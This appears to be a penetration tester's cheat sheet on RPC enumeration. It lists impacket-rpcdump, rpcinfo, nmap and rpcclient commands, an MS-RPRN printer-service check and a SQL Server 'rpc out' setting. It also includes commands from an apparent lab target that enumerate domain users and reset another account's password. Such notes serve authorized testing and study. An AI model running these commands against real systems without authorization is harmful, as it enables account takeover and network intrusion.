# RPC

## Overview

RPC endpoint discovery, Windows RPC enumeration, and portmapper-driven follow-up.

## Default Ports

- 111/tcp+udp portmapper on Unix-like systems; many dynamic RPC endpoints on Windows

## impacket-rpcdump

```
impacket-rpcdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
bash
rpcinfo -p <target>
nmap --script=rpc-grind -p 111 <target>
```

## impacket Rpcdump check printer service

```
impacket-rpcdump <domain>/'<user>':'<password>'@<dc-ip> | grep MS-RPRN
```

## RPCOut (ErrorMsg: is not configured for RPC)

```
EXEC sp_serveroption '<ServerName>', 'rpc out', 'true';
```

---

```
rpcclient 192.168.162.122 -N
```
```
rpcclient -W '' -c querydispinfo -U''%'' '192.168.181.175'
```
```
rpcclient -U nagoya-industries/svc_helpdesk 192.168.167.21
# commands from Nagoya
enumdomusers
enumdomgroups
queryusergroups 0x46c
setuserinfo christopher.lewis 23 'Admin!23'
```

## Common Attack Paths

- User/group enumeration through `rpcclient` when null or low-privilege access is available.
- Printer-related exposure checks (`MS-RPRN`) and other service discovery via `rpcdump`.
- Portmapper exposure that helps identify follow-on services such as NFS or other RPC-bound components.

## See Also

- `06 Services/NFS.md`
- `06 Services/SMB.md`
